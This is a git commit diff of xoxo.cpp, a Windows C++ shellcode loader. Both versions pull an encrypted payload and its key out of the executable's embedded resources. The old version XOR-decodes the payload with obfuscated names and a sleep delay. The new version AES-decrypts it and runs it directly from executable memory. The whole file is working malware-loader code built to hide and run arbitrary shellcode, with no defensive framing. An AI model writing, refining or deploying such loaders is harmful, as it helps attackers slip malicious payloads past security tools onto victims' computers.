308de23bce8b5bfbf384e8bfbb19d7767e6e3d4c
Murtaza ( aka cisco) <pctech283@gmail.com>
2025-04-25 03:42:24 +0500

    xoxo.cpp

--- xoxo.cpp
+++ xoxo.cpp
@@ -1,41 +1,72 @@
 #include <windows.h>
-#include <stdio.h>
 #include <wincrypt.h>
-#pragma comment (lib, "crypt32.lib")
-#pragma comment (lib, "user32.lib")
+#include <stdio.h>
+#pragma comment(lib, "advapi32.lib")
 
-void resloamadappa(const char* enapparename, char** data, DWORD* size) {
+// Helper to load encrypted resources
+void LoadResourceData(const char* name, char** data, DWORD* size) {
     HMODULE hModule = GetModuleHandle(NULL);
-    HRSRC hResource = FindResource(hModule, enapparename, RT_RCDATA);
-
+    HRSRC hResource = FindResourceA(hModule, name, RT_RCDATA);
     HGLOBAL hResData = LoadResource(hModule, hResource);
     *size = SizeofResource(hModule, hResource);
     *data = (char*)LockResource(hResData);
 }
 
+// Decrypt AES-256-CBC with IV = 16 null bytes
+bool AESDecrypt(BYTE* encryptedData, DWORD encryptedSize, BYTE* key, DWORD keySize, BYTE** output, DWORD* outputSize) {
+    HCRYPTPROV hProv = NULL;
+    HCRYPTKEY hKey = NULL;
+    HCRYPTHASH hHash = NULL;
+    bool success = false;
+    BYTE iv[16] = { 0 };
+
+    if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
+        if (CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
+            CryptHashData(hHash, key, keySize, 0);
+            if (CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
+                CryptSetKeyParam(hKey, KP_IV, iv, 0);
+
+                BYTE* buffer = (BYTE*)malloc(encryptedSize);
+                memcpy(buffer, encryptedData, encryptedSize);
+
+                DWORD dataLen = encryptedSize;
+                if (CryptDecrypt(hKey, 0, TRUE, 0, buffer, &dataLen)) {
+                    *output = buffer;
+                    *outputSize = dataLen;
+                    success = true;
+                } else {
+                    free(buffer);
+                }
+                CryptDestroyKey(hKey);
+            }
+            CryptDestroyHash(hHash);
+        }
+        CryptReleaseContext(hProv, 0);
+    }
+    return success;
+}
 
 int main() {
     Sleep(2500);
 
-    char* keu789;
-    DWORD keu789Len;
-    resloamadappa("dhanushkey1", &keu789, &keu789Len);
+    char* encryptedPayload = nullptr;
+    DWORD payloadSize = 0;
+    LoadResourceData("aes_payload", &encryptedPayload, &payloadSize);
 
-    char* kkcode;
-    DWORD kkcodeLen;
-    resloamadappa("dhanushcode56", &kkcode, &kkcodeLen);
+    char* aesKey = nullptr;
+    DWORD keySize = 0;
+    LoadResourceData("aes_key", &aesKey, &keySize);
 
-    LPVOID sirajpura = VirtualAllocExNuma(GetCurrentProcess(), NULL, kkcodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0xFFFFFFFF);
-    for (DWORD a = 0; a < kkcodeLen; a++) {
-        kkcode[a] ^= keu789[a % keu789Len]; 
+    BYTE* decrypted = nullptr;
+    DWORD decryptedSize = 0;
+
+    if (AESDecrypt((BYTE*)encryptedPayload, payloadSize, (BYTE*)aesKey, keySize, &decrypted, &decryptedSize)) {
+        LPVOID execMem = VirtualAlloc(NULL, decryptedSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        memcpy(execMem, decrypted, decryptedSize);
+        ((void(*)())execMem)();
+        free(decrypted);
     }
-
-    memcpy(sirajpura, kkcode, kkcodeLen);
-    DWORD oldProtect;
-    VirtualProtect(sirajpura, kkcodeLen, PAGE_EXECUTE_READ, &oldProtect);
-
-    HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)sirajpura, NULL, 0, NULL);
-    WaitForSingleObject(tHandle, INFINITE);
 
     return 0;
 }
+
